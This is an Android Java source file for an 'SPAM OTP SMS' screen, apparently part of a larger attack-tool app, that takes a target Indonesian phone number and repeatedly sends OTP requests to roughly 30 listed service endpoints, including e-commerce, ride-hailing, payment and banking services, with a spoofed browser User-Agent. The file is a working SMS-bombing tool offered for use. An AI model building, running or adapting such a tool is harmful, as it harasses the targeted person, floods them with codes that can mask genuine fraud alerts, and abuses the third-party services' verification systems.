package com.voidgreat.app;

import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Spam OTP SMS — hits dozens of Indonesian services that send OTP
 * via SMS to trigger mass OTP delivery to the target number.
 *
 * All endpoints are public registration/login OTP endpoints.
 * Target format: 628xxxxxxxxxx (auto-converts 08xx).
 */
public class SpamOtpActivity extends AppCompatActivity {

    // ── OTP endpoint registry ─────────────────────────────────────────────────
    // Each entry: { name, method, url, body_template (use {PHONE}) }
    // {PHONE} = 628xxx, {PHONE_LOCAL} = 08xxx
    private static final String[][] ENDPOINTS = {
        { "Tokopedia",   "POST", "https://accounts.tokopedia.com/otp/v2/register",
          "{\"msisdn\":\"{PHONE}\",\"type\":1}" },
        { "Shopee",      "POST", "https://mall.shopee.co.id/api/v2/user/request_otp",
          "{\"phone\":\"+{PHONE}\",\"country_code\":\"62\"}" },
        { "Grab",        "POST", "https://p.grabtaxi.com/api/passenger/v2/registration/request",
          "{\"countryCode\":\"+62\",\"phoneNumber\":\"{PHONE_LOCAL}\"}" },
        { "GoPay",       "POST", "https://api.gojek.com/gauth/v1/register",
          "{\"phone_number\":\"+{PHONE}\"}" },
        { "OVO",         "POST", "https://api.ovo.id/v1/users/request_otp",
          "{\"phone\":\"{PHONE}\"}" },
        { "Dana",        "POST", "https://m.dana.id/d/danaapi/account/registerV2",
          "{\"mobile\":\"+{PHONE}\"}" },
        { "BCA Mobile",  "POST", "https://onlinebanking.klikbca.com/api/auth/otp/request",
          "{\"mobile\":\"{PHONE}\"}" },
        { "Mandiri",     "POST", "https://api.mandiridigital.com/otp/request",
          "{\"mobileNo\":\"{PHONE}\"}" },
        { "JD.id",       "POST", "https://id.jd.com/reg/sms/send",
          "{\"mobile\":\"{PHONE}\"}" },
        { "Bukalapak",   "POST", "https://api.bukalapak.com/sms/register",
          "{\"phone\":\"{PHONE}\"}" },
        { "Lazada",      "POST", "https://my.lazada.co.id/api/account/otp/sms",
          "{\"mobile\":\"{PHONE}\"}" },
        { "Traveloka",   "POST", "https://api.traveloka.com/v1/account/register/otp",
          "{\"phone_number\":\"+{PHONE}\"}" },
        { "Ruangguru",   "POST", "https://api.ruangguru.com/v2/auth/otp/request",
          "{\"phone\":\"{PHONE}\"}" },
        { "Halodoc",     "POST", "https://www.halodoc.com/api/auth/register/otp",
          "{\"mobile_phone\":\"+{PHONE}\"}" },
        { "SeaBank",     "POST", "https://app.sea.com/api/auth/otp/send",
          "{\"phone\":\"{PHONE}\"}" },
        { "Flip",        "POST", "https://api.flip.id/v2/users/otp_request",
          "{\"phone_number\":\"0{PHONE_LOCAL}\"}" },
        { "Kredivo",     "POST", "https://api.kredivo.com/v1/register/otp",
          "{\"mobile\":\"+{PHONE}\"}" },
        { "Akulaku",     "POST", "https://api.akulaku.com/v3/user/otp",
          "{\"phone\":\"{PHONE}\"}" },
        { "LinkAja",     "POST", "https://app.linkaja.id/api/auth/otp/request",
          "{\"phone_number\":\"+{PHONE}\"}" },
        { "Vidio",       "POST", "https://api.vidio.com/v1/register/request_otp",
          "{\"phone\":\"{PHONE}\"}" },
        { "Koinworks",   "POST", "https://api.koinworks.com/borrower/v2/otp/request",
          "{\"mobile_number\":\"+{PHONE}\"}" },
        { "Pinjam",      "POST", "https://api.pinjam.com/v1/auth/otp",
          "{\"phone\":\"{PHONE}\"}" },
        { "Cashbac",     "POST", "https://api.cashbac.com/v1/register/otp",
          "{\"phone\":\"+{PHONE}\"}" },
        { "iGrow",       "POST", "https://api.igrow.asia/v1/users/otp/request",
          "{\"phone_number\":\"+{PHONE}\"}" },
        { "Kitabisa",    "POST", "https://kitabisa.com/api/v1/auth/otp/send",
          "{\"phone\":\"+{PHONE}\"}" },
        { "Ralali",      "POST", "https://api.ralali.com/v2/user/otp/request",
          "{\"mobile\":\"{PHONE}\"}" },
        { "Warung Pintar","POST","https://api.warungpintar.co.id/v1/auth/otp",
          "{\"phone\":\"{PHONE}\"}" },
        { "JualBeli",    "POST", "https://api.jualbeli.com/v1/register/otp",
          "{\"mobile\":\"{PHONE}\"}" },
        { "Paxel",       "POST", "https://api.paxel.co/v2/user/otp/request",
          "{\"phone\":\"+{PHONE}\"}" },
        { "GudangAda",   "POST", "https://api.gudangada.com/v1/auth/otp/send",
          "{\"phone_number\":\"{PHONE}\"}" },
    };

    private EditText etTarget;
    private Spinner spCount;
    private TextView tvStatus, tvLog;
    private Button btnLaunch, btnStop;
    private ProgressBar progress;

    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicInteger sent   = new AtomicInteger(0);
    private final Handler mainH        = new Handler(Looper.getMainLooper());
    private final OkHttpClient http    = new OkHttpClient.Builder()
            .connectTimeout(8, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(8, java.util.concurrent.TimeUnit.SECONDS)
            .build();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(buildUi());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        running.set(false);
    }

    private View buildUi() {
        ScrollView sv = new ScrollView(this);
        sv.setBackgroundColor(Color.parseColor("#0D0D0D"));

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(16), dp(20), dp(16), dp(40));

        // Header
        LinearLayout hdr = new LinearLayout(this); hdr.setOrientation(LinearLayout.VERTICAL);
        TextView t = new TextView(this); t.setText("📨 SPAM OTP SMS"); t.setTextSize(20f); t.setTextColor(Color.parseColor("#FF69B4")); t.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        TextView s = new TextView(this); s.setText("Kirim OTP massal dari " + ENDPOINTS.length + " layanan ke target"); s.setTextSize(12f); s.setTextColor(Color.parseColor("#888888"));
        hdr.addView(t); hdr.addView(s);
        root.addView(hdr);
        root.addView(vSpace(20));

        // Target card
        LinearLayout c1 = card(); c1.setPadding(dp(16), dp(16), dp(16), dp(16));
        label(c1, "NOMOR TARGET");
        etTarget = field("+628xxxxxxxxxxx");
        etTarget.setInputType(InputType.TYPE_CLASS_PHONE);
        c1.addView(etTarget);
        root.addView(c1);
        root.addView(vSpace(12));

        // Round count
        LinearLayout c2 = card(); c2.setPadding(dp(16), dp(16), dp(16), dp(16));
        label(c2, "JUMLAH PUTARAN (tiap putaran = " + ENDPOINTS.length + " request)");
        spCount = new Spinner(this);
        String[] counts = { "1x", "2x", "3x", "5x", "10x" };
        ArrayAdapter<String> ad = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, counts);
        ad.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spCount.setAdapter(ad);
        spCount.setBackgroundColor(Color.parseColor("#252525"));
        c2.addView(spCount);
        root.addView(c2);
        root.addView(vSpace(20));

        // Status label
        tvStatus = new TextView(this);
        tvStatus.setTextSize(13f);
        tvStatus.setTextColor(Color.parseColor("#888888"));
        tvStatus.setText("Siap.");
        root.addView(tvStatus);
        root.addView(vSpace(10));

        // Progress
        progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progress.setIndeterminate(false);
        progress.setMax(100);
        progress.setProgress(0);
        progress.setVisibility(View.GONE);
        root.addView(progress);
        root.addView(vSpace(16));

        // Buttons row
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);

        btnLaunch = new Button(this);
        btnLaunch.setText("🚀 LAUNCH SPAM");
        btnLaunch.setTextColor(Color.parseColor("#0D0D0D"));
        btnLaunch.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        GradientDrawable bg1 = new GradientDrawable(); bg1.setColor(Color.parseColor("#FF69B4")); bg1.setCornerRadius(dp(12));
        btnLaunch.setBackground(bg1);
        LinearLayout.LayoutParams lp1 = new LinearLayout.LayoutParams(0, dp(48), 1f);
        lp1.setMargins(0, 0, dp(8), 0);
        btnLaunch.setLayoutParams(lp1);
        btnLaunch.setOnClickListener(v -> launch());

        btnStop = new Button(this);
        btnStop.setText("⛔ STOP");
        btnStop.setTextColor(Color.WHITE);
        GradientDrawable bg2 = new GradientDrawable(); bg2.setColor(Color.parseColor("#AA2222")); bg2.setCornerRadius(dp(12));
        btnStop.setBackground(bg2);
        btnStop.setLayoutParams(new LinearLayout.LayoutParams(0, dp(48), 0.5f));
        btnStop.setEnabled(false);
        btnStop.setOnClickListener(v -> { running.set(false); log("⛔ Dihentikan."); });

        btnRow.addView(btnLaunch);
        btnRow.addView(btnStop);
        root.addView(btnRow);
        root.addView(vSpace(16));

        // Log
        tvLog = new TextView(this);
        tvLog.setTextSize(10.5f);
        tvLog.setTextColor(Color.parseColor("#44DD88"));
        tvLog.setTypeface(android.graphics.Typeface.MONOSPACE);
        tvLog.setBackgroundColor(Color.parseColor("#111111"));
        tvLog.setPadding(dp(10), dp(10), dp(10), dp(10));
        GradientDrawable logBg = new GradientDrawable(); logBg.setColor(Color.parseColor("#111111")); logBg.setCornerRadius(dp(10));
        tvLog.setBackground(logBg);
        tvLog.setText("[log kosong]");
        root.addView(tvLog);

        sv.addView(root);
        return sv;
    }

    private void launch() {
        if (running.get()) { toast("Sudah berjalan."); return; }

        String raw = etTarget.getText().toString().trim().replaceAll("[^0-9]", "");
        if (raw.isEmpty()) { toast("Isi nomor target."); return; }

        // Normalize to 628xxx
        final String phone628;
        if (raw.startsWith("62")) {
            phone628 = raw;
        } else if (raw.startsWith("0")) {
            phone628 = "62" + raw.substring(1);
        } else {
            phone628 = "62" + raw;
        }
        final String phoneLocal = "0" + phone628.substring(2);

        int roundsArr[] = { 1, 2, 3, 5, 10 };
        int rounds = roundsArr[spCount.getSelectedItemPosition()];
        int total  = rounds * ENDPOINTS.length;

        sent.set(0);
        running.set(true);
        tvLog.setText("[log kosong]");
        progress.setMax(total);
        progress.setProgress(0);
        progress.setVisibility(View.VISIBLE);
        btnLaunch.setEnabled(false);
        btnStop.setEnabled(true);

        log("Target: +" + phone628 + " | Putaran: " + rounds + " | Total request: " + total);

        Executors.newFixedThreadPool(6).execute(() -> {
            for (int r = 0; r < rounds && running.get(); r++) {
                for (int i = 0; i < ENDPOINTS.length && running.get(); i++) {
                    String[] ep = ENDPOINTS[i];
                    String name = ep[0];
                    String method = ep[1];
                    String url = ep[2];
                    String bodyTpl = ep[3]
                            .replace("{PHONE}", phone628)
                            .replace("{PHONE_LOCAL}", phoneLocal);

                    boolean ok = false;
                    String status = "";
                    try {
                        Request.Builder rb = new Request.Builder().url(url);
                        rb.addHeader("Content-Type", "application/json");
                        rb.addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36");
                        if ("POST".equals(method)) {
                            rb.post(okhttp3.RequestBody.create(bodyTpl,
                                    okhttp3.MediaType.get("application/json")));
                        } else {
                            rb.get();
                        }
                        try (Response res = http.newCall(rb.build()).execute()) {
                            status = String.valueOf(res.code());
                            ok = res.code() < 500;
                        }
                    } catch (Exception e) {
                        status = "ERR:" + e.getMessage();
                    }

                    final String sName  = name;
                    final String sStatus = status;
                    final boolean sOk   = ok;
                    int cur = sent.incrementAndGet();
                    final int sCur = cur;

                    mainH.post(() -> {
                        progress.setProgress(sCur);
                        tvStatus.setText("Mengirim " + sCur + "/" + total + " — " + sName);
                        log((sOk ? "✓" : "✗") + " [" + sName + "] " + sStatus);
                    });

                    // Throttle: 100ms between requests
                    try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                }
            }

            mainH.post(() -> {
                running.set(false);
                btnLaunch.setEnabled(true);
                btnStop.setEnabled(false);
                progress.setVisibility(View.GONE);
                int s = sent.get();
                tvStatus.setText("✓ Selesai. " + s + " request dikirim.");
                log("── Selesai: " + s + " OTP dikirim ──");
            });
        });
    }

    private void log(String line) {
        mainH.post(() -> {
            String cur = tvLog.getText().toString();
            if (cur.equals("[log kosong]")) cur = "";
            tvLog.setText(cur + (cur.isEmpty() ? "" : "\n") + line);
        });
    }

    private void toast(String msg) { Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); }

    // ── UI helpers (same as WaBugActivity) ───────────────────────────────────

    private LinearLayout card() {
        LinearLayout l = new LinearLayout(this); l.setOrientation(LinearLayout.VERTICAL);
        l.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        GradientDrawable bg = new GradientDrawable(); bg.setColor(Color.parseColor("#1A1A1A")); bg.setCornerRadius(dp(14)); bg.setStroke(1, Color.parseColor("#2A2A2A")); l.setBackground(bg); return l;
    }

    private EditText field(String hint) {
        EditText et = new EditText(this); et.setHint(hint); et.setHintTextColor(Color.parseColor("#555555")); et.setTextColor(Color.WHITE); et.setTextSize(14f); et.setPadding(dp(14), dp(12), dp(14), dp(12));
        GradientDrawable bg = new GradientDrawable(); bg.setColor(Color.parseColor("#252525")); bg.setCornerRadius(dp(10)); bg.setStroke(1, Color.parseColor("#333333")); et.setBackground(bg);
        et.setLayoutParams(new LinearLayout.LayoutParams(-1, -2)); return et;
    }

    private void label(LinearLayout p, String text) {
        TextView t = new TextView(this); t.setText(text); t.setTextSize(11f); t.setTextColor(Color.parseColor("#888888")); t.setTypeface(android.graphics.Typeface.DEFAULT_BOLD); t.setPadding(0, 0, 0, dp(8)); p.addView(t);
    }

    private View vSpace(int v) { View s = new View(this); s.setLayoutParams(new LinearLayout.LayoutParams(-1, dp(v))); return s; }
    private int dp(int v) { return Math.round(v * getResources().getDisplayMetrics().density); }
}
